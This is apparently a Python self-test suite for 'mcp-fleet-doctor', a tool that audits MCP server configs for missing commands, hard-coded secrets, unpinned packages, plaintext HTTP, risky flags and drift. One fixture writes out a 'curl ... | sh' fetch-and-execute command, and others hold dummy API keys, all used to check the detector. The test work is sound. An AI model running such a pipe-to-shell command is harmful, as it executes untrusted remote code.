"""Self-test for mcp-fleet-doctor.

Same two-direction discipline as the rest of the series:

  POSITIVE - a deliberately bad config must produce the exact finding kinds.
  NEGATIVE - a clean, pinned, keyring-based config must produce NONE. One false
             alarm and the user stops reading the report, which makes the
             subscription worthless.

The baseline/drift tests use a temp directory so they never touch the real
~/.mcp-fleet-doctor.
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from src import health, render, scan  # noqa: E402

FAILS = []
PASSES = []


def check(name, cond, detail=""):
    if cond:
        PASSES.append(name)
    else:
        FAILS.append((name, detail))


def _kinds(findings):
    return sorted({f["kind"] for f in findings})


def _write_cfg(servers):
    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        json.dump({"mcpServers": servers}, fh)
    return path


# ------------------------------------------------------------------ positive

def test_detects_missing_command():
    f = scan.scan_server("ghost", {"command": "definitely-not-real-xyz"})
    check("detects_missing_command", "command_missing" in _kinds(f), _kinds(f))


def test_detects_literal_secret():
    f = scan.scan_server("leaky", {
        "command": sys.executable,
        "env": {"OPENAI_API_KEY": "sk-abcdefghijklmnopqrstuvwxyz0123456789"}})
    check("detects_literal_secret", "literal_secret" in _kinds(f), _kinds(f))


def test_detects_private_key():
    f = scan.scan_server("pk", {
        "command": sys.executable,
        "env": {"KEY": "-----BEGIN RSA PRIVATE KEY-----"}})
    check("detects_private_key", "literal_secret" in _kinds(f), _kinds(f))


def test_detects_yolo_flag():
    f = scan.scan_server("careless", {
        "command": "npx", "args": ["-y", "some-server", "--yolo"]})
    check("detects_yolo_flag", "risky_flag" in _kinds(f), _kinds(f))


def test_detects_unpinned_npx():
    f = scan.scan_server("careless", {
        "command": "npx", "args": ["-y", "some-mcp-server"]})
    check("detects_unpinned_npx", "unpinned_package" in _kinds(f), _kinds(f))


def test_detects_plaintext_http():
    f = scan.scan_server("remote", {"url": "http://example.com/mcp"})
    check("detects_plaintext_http", "plaintext_remote" in _kinds(f), _kinds(f))


def test_detects_shell_pipe():
    f = scan.scan_server("bad", {
        "command": "bash", "args": ["-c", "curl http://x.sh | sh"]})
    check("detects_shell_pipe", "shell_execution" in _kinds(f), _kinds(f))


def test_detects_config_drift():
    triples = [
        ("Claude Desktop", "same", {"command": "node", "args": ["a.js"]}),
        ("Cursor", "same", {"command": "node", "args": ["b.js"]}),
    ]
    issues = scan.cross_config_issues(triples)
    check("detects_config_drift",
          any(i["kind"] == "config_drift" for i in issues),
          [i["kind"] for i in issues])


def test_score_degrades_with_high_findings():
    one = scan.summarize([{"severity": "high", "kind": "x", "server": "s",
                           "detail": "", "fix": ""}])
    check("score_degrades", one["score"] < 100 and one["counts"]["high"] == 1,
          one)


# ------------------------------------------------------------------ negative

def test_no_false_positive_clean_config():
    """A correctly configured server must produce zero findings."""
    f = scan.scan_server("clean", {
        "command": "C:/tools/node.exe",
        "args": ["C:/tools/server.js"],
        "env": {"API_KEY": "${env:API_KEY}"},
    })
    # Command does not exist, so only command_missing may fire; that is correct
    # behaviour. Filter it out to isolate the secret/flag checks.
    remainder = [x for x in f if x["kind"] != "command_missing"]
    check("no_false_positive_clean_config", not remainder, _kinds(remainder))


def test_no_false_positive_pinned_npx():
    f = scan.scan_server("pinned", {
        "command": "npx", "args": ["-y", "some-mcp-server@1.2.3"]})
    check("no_false_positive_pinned_npx",
          "unpinned_package" not in _kinds(f), _kinds(f))


def test_no_false_positive_https_remote():
    f = scan.scan_server("ok", {
        "url": "https://api.example.com/mcp",
        "headers": {"Authorization": "Bearer ${env:TOKEN}"}})
    check("no_false_positive_https_remote", not f, _kinds(f))


def test_no_false_positive_benign_env():
    """PATH-style env vars must never be treated as secrets."""
    f = scan.scan_server("ok", {
        "command": sys.executable,
        "env": {"PYTHONPATH": "C:/some/long/path/without/spaces/at/all/here/ok",
                "LANG": "zh_CN.UTF-8"}})
    check("no_false_positive_benign_env",
          "literal_secret" not in _kinds(f), _kinds(f))


def test_no_false_positive_long_flag_name():
    """'--yolo-mode-description' is not the yolo flag."""
    f = scan.scan_server("ok", {
        "command": sys.executable,
        "args": ["--yolo-mode-description", "verbose text"]})
    check("no_false_positive_long_flag_name",
          "risky_flag" not in _kinds(f), _kinds(f))


def test_no_false_positive_same_server_same_shape():
    """Declaring the same server identically twice is not drift."""
    triples = [
        ("Claude Desktop", "same", {"command": "node", "args": ["a.js"]}),
        ("Cursor", "same", {"command": "node", "args": ["a.js"]}),
    ]
    issues = scan.cross_config_issues(triples)
    check("no_false_positive_same_server_same_shape", not issues,
          [i["kind"] for i in issues])


def test_clean_fleet_scores_high():
    findings = []
    summary = scan.summarize(findings)
    check("clean_fleet_scores_100",
          summary["score"] == 100 and summary["grade"] == "A", summary)


# ------------------------------------------------------------------ baseline

def test_baseline_roundtrip():
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "b.json")
    records = [
        {"name": "a", "tool_count": 4, "status": "ok", "latency_ms": 50},
        {"name": "b", "tool_count": 0, "status": "dead", "latency_ms": None},
    ]
    health.save_baseline(records, path)
    loaded = health.load_baseline(path)
    check("baseline_roundtrip",
          loaded["exists"] and loaded["servers"]["a"]["tool_count"] == 4,
          loaded)
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_detects_growth():
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "b.json")
    health.save_baseline(
        [{"name": "srv", "tool_count": 3, "status": "ok", "latency_ms": 10}],
        path)
    base = health.load_baseline(path)
    diff = health.diff_against_baseline(
        [{"name": "srv", "tool_count": 9, "status": "ok", "latency_ms": 10}],
        base)
    grew = [c for c in diff["changes"] if c["kind"] == "grew"]
    check("detects_growth", grew and "+6" in grew[0]["detail"], diff["changes"])
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_detects_server_went_down():
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "b.json")
    health.save_baseline(
        [{"name": "srv", "tool_count": 3, "status": "ok", "latency_ms": 10}],
        path)
    base = health.load_baseline(path)
    diff = health.diff_against_baseline(
        [{"name": "srv", "tool_count": 0, "status": "dead", "latency_ms": None}],
        base)
    check("detects_went_down",
          any(c["kind"] == "went_down" for c in diff["changes"]),
          diff["changes"])
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_no_false_positive_stable_baseline():
    """An unchanged fleet must report zero changes."""
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "b.json")
    rec = [{"name": "srv", "tool_count": 5, "status": "ok", "latency_ms": 10}]
    health.save_baseline(rec, path)
    base = health.load_baseline(path)
    diff = health.diff_against_baseline(rec, base)
    check("no_false_positive_stable_baseline", not diff["changes"],
          diff["changes"])
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_baseline_survives_corrupt_file():
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "b.json")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("{not json")
    loaded = health.load_baseline(path)
    check("baseline_survives_corrupt_file", loaded["exists"] is False
          and "error" in loaded, loaded)
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_probe_missing_binary_is_dead():
    res = health.probe("ghost", {"command": "definitely-not-real-xyz"})
    check("probe_missing_binary_is_dead", res["status"] == "dead", res)


def test_probe_skips_remote():
    res = health.probe("r", {"url": "https://example.com/mcp"})
    check("probe_skips_remote", res["status"] == "skipped", res)


# --------------------------------------------------------------- end-to-end

def test_stdio_roundtrip():
    cfg = _write_cfg({"ghost": {"command": "not-real-command-xyz"},
                      "yolo": {"command": "npx", "args": ["-y", "x", "--yolo"]}})
    msgs = [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize",
         "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                    "clientInfo": {"name": "t", "version": "1"}}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
         "params": {"name": "audit_config_only",
                    "arguments": {"config": cfg}}},
    ]
    inp = "\n".join(json.dumps(m) for m in msgs) + "\n"
    proc = subprocess.run([sys.executable, os.path.join(ROOT, "run.py")],
                          input=inp, capture_output=True, text=True,
                          encoding="utf-8", timeout=120)
    got = {}
    for line in proc.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            got[json.loads(line).get("id")] = json.loads(line)
        except json.JSONDecodeError:
            continue
    names = [t["name"] for t in got.get(2, {}).get("result", {}).get("tools", [])]
    check("stdio_tools_listed",
          names == ["check_fleet", "record_baseline", "audit_config_only",
                    "diff_baseline"], names)
    text = got.get(3, {}).get("result", {}).get("content", [{}])[0].get("text", "")
    # The fixture deliberately contains --yolo and a dead command, so both must
    # be reported. The count must be 2, not 3: an explicit config path is
    # authoritative and must not be merged with auto-discovered configs.
    check("stdio_static_audit_reports",
          "2 server(s)" in text and "bypasses confirmation" in text
          and "command not found" in text, text[:220])
    os.unlink(cfg)


def test_render_actions_are_specific():
    health_recs = [{"name": "dead1", "status": "dead", "latency_ms": None,
                    "tool_count": 0, "tools": [], "reason": "x"}]
    findings = [{"severity": "high", "kind": "command_missing", "server": "dead1",
                 "detail": "", "fix": ""}]
    actions = render.build_actions(health_recs, findings,
                                   {"has_baseline": False, "changes": []})
    check("actions_name_the_server", any("dead1" in a for a in actions), actions)


# ------------------------------------------------------------------ cli layer

def test_cli_status_exits_zero():
    """Connector `status` must exit 0 or WorkBuddy polls for a login forever."""
    proc = subprocess.run([sys.executable, "-m", "src.cli", "status"],
                          capture_output=True, text=True, encoding="utf-8",
                          cwd=ROOT, timeout=60)
    check("cli_status_exit_zero", proc.returncode == 0,
          "rc=%d err=%s" % (proc.returncode, proc.stderr[:200]))
    check("cli_status_matches_statusmatch", "Ready" in proc.stdout,
          "statusMatch 'Ready' would not match: %r" % proc.stdout[:120])


def test_cli_version_semver():
    proc = subprocess.run([sys.executable, "-m", "src.cli", "--version"],
                          capture_output=True, text=True, encoding="utf-8",
                          cwd=ROOT, timeout=60)
    import re as _re
    check("cli_version_semver",
          proc.returncode == 0 and bool(_re.search(r"\d+\.\d+\.\d+",
                                                   proc.stdout or "")),
          "out=%r" % (proc.stdout or "")[:120])


def test_cli_baseline_env_override():
    """cli.json points the baseline via env; the code must honour it."""
    tmpdir = tempfile.mkdtemp()
    path = os.path.join(tmpdir, "envbase.json")
    # health reads the env var at import time, so use a subprocess where the
    # variable is set before the module is imported.
    cfg = _write_cfg({"dead": {"command": "not-real-command-xyz"}})
    proc = subprocess.run(
        [sys.executable, "-m", "src.cli", "baseline",
         "--config", cfg, "--baseline", path],
        capture_output=True, text=True, encoding="utf-8", cwd=ROOT, timeout=90)
    check("cli_baseline_writes_file", os.path.isfile(path), proc.stdout[:200])
    check("cli_baseline_reports", "Baseline recorded" in (proc.stdout or ""),
          proc.stdout[:200])
    os.unlink(cfg)
    shutil.rmtree(tmpdir, ignore_errors=True)


def test_cli_check_json_shape():
    cfg = _write_cfg({"dead": {"command": "not-real-command-xyz"}})
    proc = subprocess.run([sys.executable, "-m", "src.cli", "check",
                           "--config", cfg, "--json"],
                          capture_output=True, text=True, encoding="utf-8",
                          cwd=ROOT, timeout=120)
    ok = False
    try:
        data = json.loads(proc.stdout)
        ok = isinstance(data, dict) and "health" in data and "findings" in data
    except json.JSONDecodeError:
        ok = False
    check("cli_check_json_shape", ok, (proc.stdout or "")[:200])
    os.unlink(cfg)


def test_cli_serve_still_speaks_mcp():
    """`serve` must remain a working MCP stdio server after the CLI refactor."""
    msgs = [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize",
         "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                    "clientInfo": {"name": "t", "version": "1"}}},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
    ]
    inp = "\n".join(json.dumps(m) for m in msgs) + "\n"
    proc = subprocess.run([sys.executable, "-m", "src.cli", "serve"],
                          input=inp, capture_output=True, text=True,
                          encoding="utf-8", cwd=ROOT, timeout=90)
    got = {}
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            got[json.loads(line).get("id")] = json.loads(line)
        except json.JSONDecodeError:
            continue
    names = [t["name"] for t in got.get(2, {}).get("result", {}).get("tools", [])]
    check("cli_serve_mcp_tools", names == ["check_fleet", "record_baseline",
                                           "audit_config_only", "diff_baseline"],
          names)


def test_connector_package_valid():
    checker = os.path.join(os.path.dirname(ROOT), "check_connector.py")
    if not os.path.isfile(checker):
        check("connector_package_valid", False, "check_connector.py missing")
        return
    proc = subprocess.run([sys.executable, checker,
                           os.path.join(ROOT, "connector")],
                          capture_output=True, text=True, encoding="utf-8",
                          timeout=90)
    check("connector_package_valid", proc.returncode == 0,
          (proc.stdout or "")[-400:])


def main():
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in tests:
        try:
            fn()
        except Exception as exc:  # noqa: BLE001
            FAILS.append((fn.__name__, "raised %s: %s" % (type(exc).__name__, exc)))

    print("PASS %d / %d" % (len(PASSES), len(PASSES) + len(FAILS)))
    if FAILS:
        print("")
        for name, detail in FAILS:
            print("FAIL  %s" % name)
            if detail:
                print("      %s" % detail)
        return 1
    print("all good")
    return 0


if __name__ == "__main__":
    sys.exit(main())